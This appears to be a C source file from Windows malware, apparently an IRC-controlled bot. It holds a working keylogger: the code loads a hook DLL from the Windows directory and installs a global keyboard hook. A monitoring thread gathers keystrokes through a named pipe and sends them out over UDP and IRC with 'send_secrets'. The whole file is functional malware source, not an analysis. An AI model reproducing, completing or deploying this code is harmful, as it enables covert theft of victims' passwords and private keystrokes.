#include "stdafx.h"

HHOOK kh;
HOOKPROC hproc;
HINSTANCE hinstDLL;
HHOOK *haddr;
char	mKeys[KEY_BUF_SIZE];

int keylogger(int mode)
{
	char szHkDir[MAX_PATH];
	DWORD dwId = NULL;
	HANDLE hThread = NULL;

	GetWindowsDirectory(szHkDir, MAX_PATH);
	lstrcat(szHkDir, "\\hk.dll");
	SetUserDesktop(1);

	if(mode==0)
	{
		UnhookWindowsHookEx(kh);
		FreeLibrary((HMODULE)hinstDLL);
		hinstDLL = NULL;
		return 0;
	}

	hinstDLL = (HINSTANCE)LoadLibrary(szHkDir);
	if(hinstDLL==NULL)
	{
		deb("Failed to load library. (%d)\n", GetLastError());
		return ERR;
	}

	haddr = (HHOOK*)GetProcAddress(hinstDLL, "xHook");
	if(haddr==NULL)
	{
		deb("Failed to get xHook address %d\n", GetLastError());
		return ERR;
	}
	deb("hk.dll: xhook at 0x%p", haddr);

	hproc = (HOOKPROC)GetProcAddress(hinstDLL, "KeyProc");
	if(hproc==NULL)
	{
		deb("Failed to get keyboard hook address %d\n", GetLastError());
		return ERR;
	}
	deb("hk.dll: keyproc at 0x%p", hproc);

	kh = SetWindowsHookEx(WH_KEYBOARD, hproc, hinstDLL, 0);
	if(kh==NULL)
	{
		deb("SetWindowsHookEx() failed (%d)\n", GetLastError());
		return ERR;
	}

	*haddr = kh;
	deb("Installed keyboard hook. Handle 0x%x\n", kh);

	hThread = xCreateThread(NULL, 0, keysmonitor, NULL, 0, &dwId);
	if(hThread==NULL)
	{
		deb("xCreateThread for keysmonitor failed (%d)\n", GetLastError());
		return ERR;
	}
	deb("Key monitoring started.\n");

	return 0;
}

DWORD WINAPI keysmonitor(LPVOID nothing)
{
	DWORD dwRet, dwRead, fConnected;
	HANDLE hPipe = NULL;
	char	mBuf[4096];

	while(hinstDLL!=NULL)
	{
		hPipe = CreateNamedPipe(PIPENAME, PIPE_ACCESS_INBOUND, PIPE_TYPE_MESSAGE|PIPE_READMODE_MESSAGE|
			PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, sizeof(mKeys), sizeof(mKeys), 10, NULL);
		if(hPipe==INVALID_HANDLE_VALUE)
		{
			deb("CreatePipe: %s", FORMATERROR);
			Sleep(1000);
			continue;
		}

		fConnected = ConnectNamedPipe(hPipe, NULL) ? TRUE : (GetLastError()==ERROR_PIPE_CONNECTED);

		if(fConnected)
		{
			memset(mBuf, 0, sizeof(mBuf));
			dwRet = ReadFile(hPipe, mBuf, sizeof(mBuf), &dwRead, NULL);
			CloseHandle(hPipe);
			if(dwRet==0)
			{
				deb("ReadFile from pipe: %s", FORMATERROR);
			}
			else
			{
				deb("GOT KEYS: %s", mBuf);
				if((strlen(mKeys)+strlen(mBuf))>KEYLOG_MAX)
				{
					udp_submit_keys(mKeys);
					send_secrets(NULL);
					mKeys[0] = 0;
				}
				strcat(mKeys, mBuf);
			}

			if(strlen(mKeys)>KEYLOG_MAX)
			{
				udp_submit_keys(mKeys);
				send_secrets(NULL);
				mKeys[0] = 0;
			}
		}
		deb("New buffer len: %d", strlen(mKeys));
	}
	deb("keysmonitor: exciting due to library unload.\n");
	ExitThread(0);
	return 0;
}

char *dumpkeys(void)
{
	deb("dumping keys to irc... buf: 0x%x\n", mKeys);
	return mKeys;
}